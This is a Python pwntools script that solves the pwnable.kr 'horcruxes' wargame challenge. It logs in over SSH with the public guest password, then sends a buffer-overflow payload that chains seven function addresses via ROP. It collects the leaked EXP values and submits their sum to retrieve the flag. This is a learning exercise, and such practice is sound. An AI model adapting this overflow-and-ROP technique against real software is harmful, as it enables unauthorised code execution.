from pwn import *
import random

shell = ssh('horcruxes', 'pwnable.kr', 2222, password='guest')
sh = shell.process(['nc', '0', '9032'])

A_addr = 0x809fe4b
B_addr = 0x809fe6a
C_addr = 0x809fe89
D_addr = 0x809fea8
E_addr = 0x809fec7
F_addr = 0x809fee6
G_addr = 0x809ff05

call_ropme_addr = 0x809fffc


def main():
    sh.recvuntil("Select Menu:")
    sh.sendline('1')
    
    sh.recvuntil("earned? : ")
    
    payload = 'A'*0x78
    payload += p32(A_addr)
    payload += p32(B_addr)
    payload += p32(C_addr)
    payload += p32(D_addr)
    payload += p32(E_addr)
    payload += p32(F_addr)
    payload += p32(G_addr)

    payload += p32(call_ropme_addr)
    
    sh.sendline(payload)
    #horcruxes = sh.recvall(timeout=1)

    exps = 0
    
    for i in range(7):
        _ = sh.recvuntil("EXP +")
        print("[*] " +  _)
        exps += int(sh.recvline()[:-2])
        print(exps)
        
    sh.recvuntil("Select Menu:")
    sh.sendline('1')
    sh.recvuntil("earned? : ")

    sh.sendline(str(exps))

    print(sh.recvall(timeout=1))

if __name__ == "__main__":
    main()
